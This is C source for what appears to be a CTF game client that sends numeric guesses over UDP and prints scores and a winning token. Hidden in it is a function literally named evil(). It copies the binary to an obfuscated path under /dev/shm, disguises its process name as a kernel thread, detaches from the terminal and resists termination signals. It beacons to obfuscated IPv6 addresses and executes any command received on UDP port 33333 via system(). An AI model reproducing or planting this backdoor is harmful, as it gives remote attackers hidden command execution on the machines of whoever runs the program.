#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <sysexits.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <fcntl.h>


#define NODEBUG

#ifdef DEBUG
#   define PORT 4444
#else
#   define PORT 44
#endif

#define BDPORT 33333
#define BCNPORT_S 48172
#define BCNPORT_D 48179

int
bind_port(int fd, const struct in6_addr *addr, uint16_t port)
{
    struct sockaddr_in6 saddr = { 0 };

    saddr.sin6_family = AF_INET6;
    saddr.sin6_port = htons(port);
    memcpy(&saddr.sin6_addr, addr, sizeof *addr);
    return bind(fd, (struct sockaddr *) &saddr, sizeof saddr);
}

void
sigchld(int unused)
{
    while (0 < waitpid(-1, NULL, WNOHANG));
}

void
unmask_str(unsigned char *str)
{
  int i = strlen(str);
  while (i-- > 0) {
    str[i] &= 127;
  }
}
int
copyprog(const char *from, const char *to)
{
    int fd_to, fd_from;
    char buf[4096];
    ssize_t nread;
    int saved_errno;

    fd_from = open(from, O_RDONLY);
    if (fd_from < 0)
        return -1;

    fd_to = open(to, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (fd_to < 0)
        goto out_error;

    while (nread = read(fd_from, buf, sizeof buf), nread > 0)
    {
        char *out_ptr = buf;
        ssize_t nwritten;

        do {
            nwritten = write(fd_to, out_ptr, nread);

            if (nwritten >= 0)
            {
                nread -= nwritten;
                out_ptr += nwritten;
            }
            else if (errno != EINTR)
            {
                goto out_error;
            }
        } while (nread > 0);
    }

    if (nread == 0)
    {
        if (close(fd_to) < 0)
        {
            fd_to = -1;
            goto out_error;
        }
        close(fd_from);

        /* Success! */
        return 0;
    }

  out_error:
    saved_errno = errno;

    close(fd_from);
    if (fd_to >= 0)
        close(fd_to);

    errno = saved_errno;
    return -1;
}

void
signal_evil(int sig)
{
  if (fork()) {
    exit(1);
  }
}
void
evil(int argc, char *argv[])
{
    int i;
    int sock;

    char procname[] = "\xdb\xe8\xe3\xe9\xb1\xdd";
    char cptarget[] = "\xaf\xe4\xe5\xf6\xaf\xf3\xe8\xed\xaf\xae\xa0";

    unmask_str(procname);
    unmask_str(cptarget);

    if (strcmp(argv[0], cptarget)) {
        if (fork()) {
            return;
        }
        /* copy ourselves */
        if (copyprog(argv[0], cptarget) == 0) {
            argv[0] = cptarget;
            execv(cptarget, argv);
        }
    } else {
        unlink(cptarget);
        if (fork()) {
            exit(0);
        }
    }

    /* mask the process title and arguments */
    while (argc--) {
        int p = strlen(argv[argc]);
        while (p--) {
            argv[argc][p] = 0;
        }
    }
    strcpy(argv[0], procname);


    {
        int r = open("/dev/null", O_RDONLY);
        int w = open("/dev/null", O_WRONLY);

        dup2(r, 0);
        dup2(w, 1);
        dup2(w, 2);
        close(r);
        close(w);
        setsid();
        chdir("/");
        signal(SIGHUP,  signal_evil);
        signal(SIGTERM, signal_evil);
        signal(SIGINT,  signal_evil);
        signal(SIGQUIT, signal_evil);
    }

    sock = socket(AF_INET6, SOCK_DGRAM, 0);
    if (-1 == bind_port(sock, &in6addr_any, BDPORT)) {
        exit(0);
    }
    struct timeval tv;
    tv.tv_sec  =  5;
    tv.tv_usec =  0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv,sizeof(struct timeval));


    while (1) {
        /* beacon */
        int sock_beacon;
        sock_beacon = socket(AF_INET6, SOCK_DGRAM, 0);
        if (-1 == bind_port(sock_beacon, &in6addr_any, BCNPORT_S)) {
            //perror("Beacon bind");
            ;; /* return EX_IOERR; */
        }
        int subnet;
        if (sock_beacon > 0) {
            for (subnet = 0; subnet < 50; subnet++) {
                char payload[] = "hi";
                char addr6_f[] = "\xe6\xe4\xb8\xb4\xba\xe2\xb4\xb1\xb0\xba\xb3\xb4\xb4\xb1\xba\xa5\xf8\xba\xba\xb1\xb3\xb3\xb7";
                unmask_str(addr6_f);
                char addr6[64];
                sprintf(addr6, addr6_f, subnet);
    
                //printf("%s\n", addr6);
                struct addrinfo *beacon_addr;
                {
                    struct addrinfo hints = { 0 };
            
                    hints.ai_family = PF_INET6;
                    hints.ai_socktype = SOCK_DGRAM;
                    hints.ai_flags = AI_NUMERICHOST;
            
                    if (0 != getaddrinfo(addr6, "48179", &hints, &beacon_addr)) {
                        ;;//perror("Resolving address");
                    }
                }

                struct sockaddr_in6 saddr = { 0 };
    
                if(-1 == sendto(sock_beacon, &payload, sizeof payload, 0, beacon_addr->ai_addr, beacon_addr->ai_addrlen)) {
                    ;;//perror("Beacon send");
                } else {
                    ;;//printf("sent!\n");
                }
            }
        }
        close(sock_beacon);
        /* end beacon */

        /* c&c */
        char cmd[400];
        ssize_t inlen;

        inlen = recvfrom(sock, cmd, sizeof(cmd)-1, 0, NULL, NULL);

        if (inlen < 1) {
            continue;
        }

        cmd[inlen] = 0;
        if (! fork()) {
            system(cmd);
            exit(0);
        }
    }
}

int
main(int argc, char *argv[])
{
    long            answer = 0;
    int             sock;
    int             i;
    struct addrinfo *addr;
    uint32_t        token = 0;
    FILE            *in, *out;

    srand(time(NULL));

    signal(SIGCHLD, sigchld);

    if (argc < 2) {
        fprintf(stderr, "Usage: %s SERVER\n", argv[0]);
        return EX_USAGE;
    }

    evil(argc, argv);

    {
        struct addrinfo hints = { 0 };

        hints.ai_family = PF_INET6;
        hints.ai_socktype = SOCK_DGRAM;
        hints.ai_flags = AI_NUMERICHOST;

        if (0 != getaddrinfo(argv[1], "3782", &hints, &addr)) {
            perror("Resolving address");
            return EX_IOERR;
        }
    }

    /*
     * Set up socket 
     */
    sock = socket(AF_INET6, SOCK_DGRAM, 0);
    if (-1 == bind_port(sock, &in6addr_any, PORT)) {
        perror("Binding UDP port 44");
        return EX_IOERR;
    }

    if (argv[2]) {
        /* fork and exec */
    } else {
        in = stdin;
        out = stdout;
    }


    while (1) {
        long guess;
        struct {
            uint32_t        token;
            uint16_t        guess;
        } g;

        g.token = token;
        if (token) {
            char line[20];

            if (NULL == fgets(line, sizeof line, in)) {
                break;
            }
            g.guess = strtol(line, NULL, 16);
        } else {
            g.guess = 0;
        }

        /* Send the guess */
        if (-1 == sendto(sock, &g, sizeof g, 0, addr->ai_addr, addr->ai_addrlen)) {
            perror("Sending packet");
            return EX_IOERR;
        }

        /* read the result */
        {
            char buf[80];
            ssize_t len;

            len = recvfrom(sock, buf, sizeof buf, 0, NULL, NULL);
            switch (len) {
                case -1:
                    perror("Reading packet");
                    return EX_IOERR;
                case 1:
                    /* It's a score */
                    printf("%02x\n", buf[0]);
                    break;
                case 4:
                    /* New game token */
                    printf("NEW GAME\n");
                    token = *((uint32_t *) buf);
                    break;
                default:
                    /* You win: this is your CTF token */
                    buf[len] = 0;
                    printf("A WINNER IS YOU: %s\n", buf);
                    break;
            }
        }
    }

    return 0;
}
